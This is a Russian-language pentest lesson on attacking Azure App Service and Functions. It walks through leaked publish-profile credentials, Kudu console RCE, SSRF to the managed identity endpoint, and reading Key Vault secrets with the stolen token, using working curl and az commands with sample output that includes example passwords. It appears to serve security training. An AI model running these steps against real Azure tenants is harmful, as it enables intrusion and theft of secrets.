---
id: cloud-azure-appservice
title: "Azure App Service и Functions: SSRF, Kudu и захват managed identity"
category: cloud
parent: cloud-azure-deep
difficulty: hard
order: 2
tags: [cloud, azure, app-service, functions, kudu, scm, managed-identity, ssrf]
prerequisites: [cloud-azure-deep, cloud-azure-managed-identity]
useful_for:
  - "Пентест Azure App Service и Functions"
  - "Захват managed identity через SSRF/RCE"
  - "Использование Kudu/SCM для выполнения кода"
estimated_minutes: 50
summary: "Как устроены Azure App Service и Functions, чем опасен Kudu/SCM-эндпоинт, как через SSRF или Kudu получить managed identity токен и дойти до Key Vault, ARM и Graph."
---

## Задача

В Azure-приложении на **App Service** ты нашёл **SSRF** — уязвимость, при которой сервер по твоему указанию сам делает HTTP-запрос по произвольному адресу. Как превратить это в данные и в права? Ответ — **managed identity (MI)**: беспарольная «учётка» приложения, токен которой выдаётся локально. Задача урока — пройти путь «SSRF → MI-токен → Key Vault», а если повезёт — «Kudu → RCE».

## Что такое App Service, Functions и Kudu

**Azure App Service** — платформа для веб-приложений (PaaS: Azure сам управляет ОС и рантаймом). **Azure Functions** — серверлесс-функции на том же хостинге. Приложение живёт на **App Service Plan** (тариф по вычислительным ресурсам).

Особая деталь Azure, которой нет у AWS/GCP, — **Kudu/SCM**: управляющий сайт на отдельном имени `*.scm.azurewebsites.net`. Через него доступны файловый менеджер, логи и **консоль** (`/api/command`). Доступ по **deployment credentials** (логин/пароль уровня приложения) или по **publish profile** (XML с кредами и URL). Утечка publish profile = полный деплой.

Ещё две вещи, важные для атаки:

- **Managed identity** — system-assigned (одна на приложение) или user-assigned (можно привязать несколько). Токен выдаётся через локальный `IDENTITY_ENDPOINT` с обязательным заголовком `X-IDENTITY-HEADER`.
- **Environment variables** — `APPSETTING_*`, `WEBSITE_*`, строки подключения, а также `IDENTITY_ENDPOINT` и `IDENTITY_HEADER`.

## Данные, с которыми работаем

Разведка начинается с конфигурации приложения — там часто лежат секреты и видно, есть ли MI:

```bash
$ az webapp list --query '[].{Name:name,Host:defaultHostName,MI:identity}'
[{"Name":"shop-app","Host":"shop-app.azurewebsites.net","MI":{"type":"SystemAssigned"}}]
```

У `shop-app` включена system-assigned MI. Проверяем настройки:

```bash
$ az webapp config appsettings list -n shop-app -g rg-app | grep -iE 'conn|key|secret'
{"name":"SQL_CONN","value":"Server=prod-sql.database.windows.net;User=sqladmin;Password=Pr0d_P@ss!"}
```

Строка подключения уже в открытом виде. Но цель урока — MI-токен, потому что он даёт доступ к тому, что в настройках не лежит.

## Шаг 1: проверяем Kudu/SCM

Kudu — самый быстрый путь к коду. Сначала проверяем доступность и наличие дефолтных кредов:

```bash
$ curl -s -o /dev/null -w "%{http_code}\n" https://shop-app.scm.azurewebsites.net/
401
```

401 — SCM закрыт. Но deployment credentials часто утекают через `list-publishing-profiles`, Git или CI:

```bash
$ az webapp deployment list-publishing-profiles -n shop-app -g rg-app --xml \
    | grep -oE 'userName="[^"]+"|userPWD="[^"]+"'
userName="$shop-app"
userPWD="Xy7!deploypass"
```

С этими кредами консоль Kudu даёт RCE:

```bash
$ curl -s -u '$shop-app:Xy7!deploypass' -X POST \
    https://shop-app.scm.azurewebsites.net/api/command \
    -H 'Content-Type: application/json' -d '{"command":"id","dir":"/"}'
uid=0(root) gid=0(root) groups=0(root)
```

## Шаг 2: через SSRF забираем MI-токен

Если Kudu закрыт, идём через SSRF. Уязвимость принимает URL и делает запрос. Цель — локальный MI-endpoint. Проблема: он требует заголовок `X-IDENTITY-HEADER`, а SSRF-заголовки обычно не пробрасывает. Варианты: SSRF с подстановкой заголовков, редирект, или «удобный» эндпоинт приложения, который сам ходит за токеном.

Когда токен получен:

```bash
$ curl -s "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01" \
    -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" | jq -r '.access_token' | cut -c1-20
eyJ0eXAiOiJKV1QiLCJh
```

## Шаг 3: используем токен

Определяем identity и её права:

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq '.value[].displayName'
```

Читаем Key Vault (нужен токен с аудиторией `https://vault.azure.net`):

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" \
    "https://prod-vault.vault.azure.net/secrets/sql-conn?api-version=7.4" | jq -r '.value'
Server=prod-sql.database.windows.net;User=sqladmin;Password=Pr0d_P@ss!
```

## Полный прогон от начала до конца

1. `az webapp config appsettings list` → строки подключения в открытом виде.
2. `list-publishing-profiles` → deployment creds → Kudu `/api/command` → RCE.
3. Если SCM закрыт — SSRF к `IDENTITY_ENDPOINT` → MI-токен.
4. Токен → ARM (что могу), Key Vault (секреты), Graph, Storage.
5. Найденные секреты → следующий хост.

## Если не сработало

- **Забыл `X-IDENTITY-HEADER`.** Без него App Service MI-endpoint вернёт ошибку.
- **Путаешь IMDS и App Service endpoint.** Для VM/ACI — `169.254.169.254` с заголовком `Metadata: true`; для App Service — свой `IDENTITY_ENDPOINT`.
- **Несколько MI.** Если приложение использует user-assigned MI, проверяй все — одна может быть привилегированной.
- **Kudu закрыт и SSRF «слепой».** Ищи логическую ошибку: эндпоинт `GET /api/get-secret?name=...`, который сам возвращает секрет — это не SSRF, но работает.
- **Деплой вредоносного пакета.** Zip deploy перезапускает приложение — заметно и может нарушить сервис, согласуй.
- **Functions через события.** Если есть право писать в Blob/Queue, который триггерит функцию, подсунутое событие исполнится от её MI.

## Functions: атака через источники событий

Functions можно атаковать не только по HTTP, но и через **источники событий**. Если у тебя есть право писать в Blob-контейнер или очередь, который триггерит функцию, ты запускаешь её код со своим содержимым — а исполнится он от имени MI функции. Это «инъекция через данные»: подсунутый JSON может содержать команду, SQL или путь, который функция небезопасно обработает. Ищи Function App с широкой MI и источник события, в который ты можешь писать.

## Сравнение PaaS трёх облаков

У AWS аналог — Elastic Beanstalk и Lambda, у GCP — App Engine и Cloud Functions. Общее: идентичность исполнения (managed identity в Azure, execution role в Lambda, runtime SA в GCP) и секреты в настройках приложения. Но Kudu/SCM — уникальная особенность Azure: отдельный управляющий сайт, часто доступный и хранящий креды деплоя. Поэтому в Azure всегда проверяй SCM первым — он нередко даёт RCE быстрее, чем SSRF.

## Что мы теперь знаем

- Kudu/SCM — управляющий сайт Azure; утёкшие publish profile/deployment creds дают RCE.
- MI-токен App Service выдаётся через `IDENTITY_ENDPOINT` + `X-IDENTITY-HEADER`.
- Токен работает против ARM, Key Vault, Graph, Storage в пределах прав identity.
- SSRF даёт MI-токен, только если удаётся достучаться до локального endpoint с заголовком.
- Секреты часто лежат и в app settings — проверяй до эскалации.

## На что смотреть дальше

- **cloud-azure-managed-identity**: устройство MI и её захват.
- **cloud-azure-keyvault**: что делать с токеном (две модели доступа).
- **cloud-azure-arm**: если MI имеет Contributor — эскалация через deployments.

## Квиз

Проверь себя.

```quiz
- question: "Что такое Kudu/SCM в App Service?"
  options:
    - "Сайт управления приложением с файловым менеджером и консолью"
    - "Отдельная подписка Azure"
    - "Хранилище секретов"
    - "Балансировщик"
  answer: 0
  explanation: "Kudu/SCM (scm.azurewebsites.net) даёт управление файлами и выполнение команд."
- question: "Как App Service выдаёт токен managed identity?"
  options:
    - "Через IDENTITY_ENDPOINT с заголовком X-IDENTITY-HEADER"
    - "Через 169.254.169.254 с Metadata: true"
    - "Через SAS-токен"
    - "Через account key"
  answer: 0
  explanation: "App Service использует локальный endpoint и обязательный header."
- question: "Что даёт утёкший publish profile?"
  options:
    - "Полный контроль над деплоем приложения"
    - "Только логи"
    - "Доступ к биллингу"
    - "Смену региона"
  answer: 0
  explanation: "Publish profile содержит креды и URL для деплоя."
- question: "Какая цель MI-токена в типовой цепочке эскалации?"
  options:
    - "Key Vault, ARM, Graph и Storage в пределах прав идентичности"
    - "Только DNS"
    - "Только логи"
    - "Только биллинг"
  answer: 0
  explanation: "Токен работает против любых ресурсов, на которые у MI есть права."
- question: "Почему SSRF не всегда даёт MI-токен?"
  options:
    - "Локальный endpoint требует заголовок X-IDENTITY-HEADER, который SSRF не пробрасывает"
    - "SSRF работает только по HTTPS"
    - "Токены хранятся в файле"
    - "MI отключена по умолчанию"
  answer: 0
  explanation: "Без обязательного заголовка endpoint токен не выдаёт; нужен обход или логическая ошибка."
```

## Куда дальше

В следующем уроке мы разберём **Key Vault** подробно — как из полученного MI-токена достать секреты и не перепутать плоскости. А пока главное запомни: **в Azure всегда проверяй SCM и publish profiles первыми, а MI-токен забирай через `IDENTITY_ENDPOINT` с заголовком.**

## Где пригодится

- **Пентест Azure:** App Service, Functions, MI.
- **Red team:** SSRF/RCE → MI → Key Vault.
- **Bug bounty:** Azure-приложения и утёкшие профили.
- **Blue team:** аудит SCM, MI-прав и секретов в env.
